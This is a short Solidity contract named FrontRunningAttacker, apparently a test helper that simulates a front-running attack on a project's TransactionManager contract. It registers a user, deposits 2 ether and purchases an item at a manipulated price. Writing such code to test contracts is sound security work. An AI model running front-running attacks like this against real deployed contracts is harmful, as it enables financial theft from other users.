// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract FrontRunningAttacker {
    TransactionManager tmgr;
    uint256 frontrunnedAmount;
    uint256 itemId;
    constructor(TransactionManager _tmgr, uint256 _frontrunnedAmount, uint256 _itemId) {
        tmgr = _tmgr;
        frontrunnedAmount = _frontrunnedAmount;
        itemId = _itemId;
    }

    function attack() public {
        tmgr.registerUser();
        tmgr.addBalance(2 ether);
        tmgr.purchaseItem(itemId, frontrunnedAmount - 1 ether);
    }       

}
